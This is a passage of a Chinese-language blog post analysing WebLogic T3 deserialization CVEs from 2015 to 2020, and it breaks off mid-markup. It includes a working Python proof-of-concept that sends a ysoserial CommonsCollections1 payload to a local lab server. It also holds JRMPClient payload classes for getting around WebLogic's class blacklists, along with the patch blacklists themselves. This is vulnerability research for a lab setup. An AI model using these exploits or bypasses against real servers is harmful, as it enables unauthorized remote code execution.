      <title>Weblogic T3 反序列化</title>
      <link href="/2022/05/09/weblogict3-xie-yi-gong-ji/"/>
      <url>/2022/05/09/weblogict3-xie-yi-gong-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="Weblogic-T3-反序列化"><a href="#Weblogic-T3-反序列化" class="headerlink" title="Weblogic T3 反序列化"></a>Weblogic T3 反序列化</h1><p>环境搭建：<a href="https://github.com/QAX-A-Team/WeblogicEnvironment">https://github.com/QAX-A-Team/WeblogicEnvironment</a></p><p>其中libnsl库因为源的问题装不上的话，就在Dockerfile里注释掉<code>RUN yum -y install libnsl</code></p><p>漏洞复现建议jdk7u21+weblogic1036</p><h2 id="T3"><a href="#T3" class="headerlink" title="T3"></a>T3</h2><p>T3协议时Weblogic RMI的通信协议。</p><p>关于RMI可以看我在先知社区的另一篇：<a href="https://xz.aliyun.com/t/11967">https://xz.aliyun.com/t/11967</a></p><p>RMI的基础通信协议是JRMP，支持其他协议来优化传输，比如Weblogic T3</p><h3 id="数据包组成"><a href="#数据包组成" class="headerlink" title="数据包组成"></a>数据包组成</h3><p>T3的数据包由<code>【数据包长度】【T3协议头】【反序列化标志】【数据】</code>组成</p><p>其中T3协议头是固定的，T3协议中反序列包标志为<code>fe 01 00 00</code>，<code>ac ed 00 05</code>是反序列化标志，所以标志就是<code>fe 0q 00 ac ed 00 05</code></p><p>直接搭配ysoserial就能打入序列化流</p><h3 id="T3通信过程"><a href="#T3通信过程" class="headerlink" title="T3通信过程"></a>T3通信过程</h3><p>wireshark抓个包:打poc时直接抓127.0.0.1就行</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318115442480.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318115442480.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230318115442480"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318115504954.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318115504954.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230318115504954"></p><p>首先发一个握手请求：<code>t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n</code></p><p>Weblogic回应<code>HELO:版本号.false</code>+确认请求</p><p>后面的数据包也就是我们的payload</p><h2 id="CVE-2015-4812漏洞复现"><a href="#CVE-2015-4812漏洞复现" class="headerlink" title="CVE-2015-4812漏洞复现"></a>CVE-2015-4812漏洞复现</h2><p>poc:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> popen</span><br><span class="line"><span class="keyword">import</span> struct <span class="comment"># 负责大小端的转换 </span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> stdout</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generatePayload</span>(<span class="params">gadget,cmd</span>):</span><br><span class="line">    YSO_PATH = <span class="string">&quot;ysoserial-for-woodpecker-0.5.3-all.jar&quot;</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;-jar&#x27;</span>,YSO_PATH,<span class="string">&#x27;-g&#x27;</span>,gadget,<span class="string">&#x27;-a&#x27;</span>,cmd],stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T3Exploit</span>(<span class="params">ip,port,payload</span>):</span><br><span class="line">    sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip,port))</span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span></span><br><span class="line">    sock.sendall(handshake.encode())</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">compile</span> = re.<span class="built_in">compile</span>(<span class="string">&quot;HELO:(.*).0.false&quot;</span>)</span><br><span class="line">    <span class="keyword">match</span> = <span class="built_in">compile</span>.findall(data.decode())</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Weblogic: &quot;</span>+<span class="string">&quot;&quot;</span>.join(<span class="keyword">match</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Weblogic&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span>  </span><br><span class="line">    header = binascii.a2b_hex(<span class="string">b&quot;00000000&quot;</span>)</span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>)</span><br><span class="line">    desflag = binascii.a2b_hex(<span class="string">b&quot;fe010000&quot;</span>)</span><br><span class="line">    payload = header + t3header  +desflag+  payload</span><br><span class="line">    payload = struct.pack(<span class="string">&quot;&gt;I&quot;</span>,<span class="built_in">len</span>(payload)) + payload[<span class="number">4</span>:]</span><br><span class="line">    sock.send(payload)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">&quot;CommonsCollections1&quot;</span></span><br><span class="line">    cmd = <span class="string">&quot;raw_cmd:touch /tmp/success&quot;</span></span><br><span class="line">    payload = generatePayload(gadget,cmd)</span><br><span class="line">    T3Exploit(ip,port,payload)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>更改一下ysoserialpath运行之后会显示Weblogic版本，同时在docker的&#x2F;tmp&#x2F;下创建success</p><blockquote><p>这里ysoserial用的<a href="https://github.com/woodpecker-framework/ysoserial-for-woodpecker">https://github.com/woodpecker-framework/ysoserial-for-woodpecker</a></p></blockquote><ul><li><p>poc分析：generatePayload函数先用CC1生成了序列化数据</p><p>​T3Exploit发送了一个<code>t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n</code>请求包，然后从相应包中匹配字符串<code>HELO:</code>和<code>0.false</code>中间的部分，也就是weblogic的版本号。</p><p>​然后是<code>00000000</code>进行占位，该位置为数据包长度，设置完POC后再来改。定义了固定的t3header和反序列化标志头<code>fe010000</code>。RFC1700规定使用“大端”字节序为网络字节序，所以对生成的payload使用<code>&gt;</code>大端模式打包，<code>I</code>表示unsigned int。</p></li><li><p>测试运行：</p></li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318114210400.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318114210400.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230318114210400"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318114230446.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318114230446.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230318114230446"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>反序列化的入口在weblogic.rjvm.InboundMsgAbbrev#readObject()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230317184236353.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230317184236353.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230317184236353"></p><p>ServerChannelInputStream()继承自ObjectInputStream，重写了resolveClass方法。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230317184945908.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230317184945908.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230317184945908"></p><p>其中就毫无过滤的调用了lookup，经典的jndi</p><p>调试看一下我们打的什么类过去,在resolveClass打上断点，然后打一遍payload：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318125645805.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318125645805.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230318125645805"></p><p>可以看到是AnnotationInvocationHandler类</p><h3 id="CVE-2015-4852修复"><a href="#CVE-2015-4852修复" class="headerlink" title="CVE-2015-4852修复"></a>CVE-2015-4852修复</h3><p>在InboundMsgAbbrev#readObject()中加入了if判断，对类设了黑名单（不过可以绕）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (className!=<span class="literal">null</span> &amp;&amp; className.length()&gt; <span class="number">0</span> &amp;&amp; ClassFilter.isBlackListed(className))</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvaildClassException</span>(<span class="string">&quot;Unauthorized deserialization attempt&quot;</span>,descriptor.getName());</span><br></pre></td></tr></table></figure><h2 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h2><p>复现需要打补丁，找不到懒得打了，简单说一下绕过，不写poc了</p><p>黑名单列表为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+org.apache.commons.collections.functors,</span><br><span class="line">+com.sun.org.apache.xalan.internal.xsltc.trax,</span><br><span class="line">+javassist,+org.codehaus.groovy.runtime.ConvertedClosure,</span><br><span class="line">+org.codehaus.groovy.runtime.ConversionHandler,</span><br><span class="line">+org.codehaus.groovy.runtime.MethodClosure</span><br></pre></td></tr></table></figure><p>作用于以下几个类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">weblogic.rjvm.InboundMsgAbbrev.class的子类ServerChannelInputStream</span><br><span class="line">weblogic.rjvm.MsgAbbrevInputStream.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">weblogic</span>.iiop.Utils.class</span><br></pre></td></tr></table></figure><p>打上了黑名单上的类，就基本上阻断了大部分反序列化链，所以只有舍弃这几个类的resolveClass了。</p><p><code>ObjectInputStream</code>在进行readObject时，会调用readObject,readExternal，readResolve。只封了两个子类readObject下的resolveClass，那可以换个子类嘛，又不是直接对父类readObject设了黑名单(不直接对ObjectInputStream打补丁我不是很认可doge)</p><blockquote><p>虽然 AnnotationInvocationHandler 类不在类黑名单里面，但是一些Gadget所用到的类在黑名单里面，而在AnnotationInvocationHandler 类直接通过 InboundMsgAbbrev#readObject 进行反序列化的过程中会再次调用到 ServerChannelInputStream#resolveClass 方法来处理比如 org.apache.commons.collections.map.LazyMap 类，而这个类会被黑名单检测到 ，这样一来自然就被拦截了</p></blockquote><p>我们需要找到一个类符合以下条件：</p><ol><li>readObject()中创建了自己的InputStream对象</li><li>readObject()不能是黑名单类中的readObject()</li><li>readObject()进行了反序列化</li></ol><p><code>weblogic.jms.common.StreamMessageImpl#readExternal()</code>就符合上述条件，不在黑名单内。</p><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>该函数里创建了InputStream，进行了反序列化。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318122055741.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318122055741.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230318122055741"></p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>使var3为1，var4为恶意序列化数据，重写StreamMessageImpl#writeExternal方法。</p><h2 id="CVE2016-3510"><a href="#CVE2016-3510" class="headerlink" title="CVE2016-3510"></a>CVE2016-3510</h2><p>用到的MarshalledObject#readResolve方法：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318143443290.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318143443290.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230318143443290"></p><p>恶意对象传到var2，也就是objBytes变量就行了</p><h2 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h2><p>在InboundMsgAbbrev的子类ServerChannelInputStream重写了resolveProxtClass()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveProxyClass(String[] interfaces) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">   String[] arr$ = interfaces;</span><br><span class="line">   <span class="type">int</span> <span class="variable">len$</span> <span class="operator">=</span> interfaces.length;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i$</span> <span class="operator">=</span> <span class="number">0</span>; i$ &lt; len$; ++i$) &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">intf</span> <span class="operator">=</span> arr$[i$];</span><br><span class="line">      <span class="keyword">if</span>(intf.equals(<span class="string">&quot;java.rmi.registry.Registry&quot;</span>)) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Unauthorized proxy deserialization&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">super</span>.resolveProxyClass(interfaces);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果是java.rmi.registry.Registry就抛出异常，否则执行父类的resolveProxyClass()</p><p>这里只限制了远程对象的java.rmi.registry.Registry接口，而且还是走代理才能进resolveProxy。</p><ol><li><p>不走代理，把ysoserial的Proxy部分删掉</p></li><li><p>换一个远程对象接口，不用java.rmi.registry.Registry</p></li></ol><p>具体实现看c0e3佬：<a href="https://www.cnblogs.com/nice0e3/p/14296052.html">https://www.cnblogs.com/nice0e3/p/14296052.html</a></p><p>我直接抄：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPClient1</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        String host;</span><br><span class="line">        <span class="type">int</span> port;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sep &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">        <span class="keyword">return</span> ref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient1.class.getClassLoader());</span><br><span class="line">        PayloadRunner.run(JRMPClient1.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>改接口ysoserial上自带了</p><h2 id="CVE-2018-2893"><a href="#CVE-2018-2893" class="headerlink" title="CVE-2018-2893"></a>CVE-2018-2893</h2><p>补丁：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_BLACKLIST_CLASSES = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;org.codehaus.groovy.runtime.ConvertedClosure&quot;</span>, <span class="string">&quot;org.codehaus.groovy.runtime.ConversionHandler&quot;</span>, <span class="string">&quot;org.codehaus.groovy.runtime.MethodClosure&quot;</span>, <span class="string">&quot;org.springframework.transaction.support.AbstractPlatformTransactionManager&quot;</span>, <span class="string">&quot;sun.rmi.server.UnicastRef&quot;</span>&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>黑名单加了UnicastRef，不能建立RMI连接了，也就阻断了上面两种攻击方式。</p><p>可以学习0638的绕过方式（也是封装进StreamMessageImpl），把Gadget封装进StreamMessageImpl，不走InboundMsgAbbrev也就不会遇到黑名单</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> weblogic.jms.common.StreamMessageImpl;</span><br><span class="line"><span class="keyword">import</span> ysoserial.Serializer;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">    <span class="string">&quot;restriction&quot;</span></span><br><span class="line">&#125; )</span><br><span class="line"><span class="meta">@PayloadTest( harness=&quot;ysoserial.test.payloads.JRMPReverseConnectSMTest&quot;)</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.MBECHLER &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPClient3</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">streamMessageImpl</span><span class="params">(<span class="type">byte</span>[] object)</span> &#123;</span><br><span class="line">        <span class="type">StreamMessageImpl</span> <span class="variable">streamMessage</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StreamMessageImpl</span>();</span><br><span class="line">        streamMessage.setDataBuffer(object, object.length);</span><br><span class="line">        <span class="keyword">return</span> streamMessage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span> <span class="params">(<span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String host;</span><br><span class="line">        <span class="type">int</span> port;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sep &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">objID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">tcpEndpoint</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">unicastRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(objID, tcpEndpoint, <span class="literal">false</span>));</span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">remoteObjectInvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(unicastRef);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> Proxy.newProxyInstance(JRMPClient3.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Registry.class &#125;, remoteObjectInvocationHandler);</span><br><span class="line">        <span class="keyword">return</span> streamMessageImpl(Serializer.serialize(object));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient3.class.getClassLoader());</span><br><span class="line">        PayloadRunner.run(JRMPClient3.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要weblogic 部分jar的依赖</p><h2 id="CVE-2018-3248"><a href="#CVE-2018-3248" class="headerlink" title="CVE-2018-3248"></a>CVE-2018-3248</h2><p>补丁添加了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.rmi.activation.*</span><br><span class="line">sun.rmi.server.*</span><br><span class="line">java.rmi.server.RemoteObjectInvocationHandler</span><br><span class="line">java.rmi.server.UnicastRemoteObject</span><br></pre></td></tr></table></figure><p>封装StreamMessageImpl需要用到RemoteObjectInvocationHandler远程类。远程接口实现类还必须继承UnicastRemoteObject。另外一个RMI接口也被封掉了</p><p>进行绕过的类也就必须像RemoteObjectInvocationHandler和UnicastRemoteObject一样，继承RemoteObject。这里面随便选一个。。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318152452024.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318152452024.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230318152452024"></p><h2 id="CVE-2020-2555"><a href="#CVE-2020-2555" class="headerlink" title="CVE-2020-2555"></a>CVE-2020-2555</h2><p>主要源于coherence.jar存在能gadget的类。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318154342275.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318154342275.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230318154342275"></p><p>漏洞的入口点为BadAttributeValueException.readObject()</p><ul><li>调用链：</li></ul><figure class="highlight java"><table><tr><td 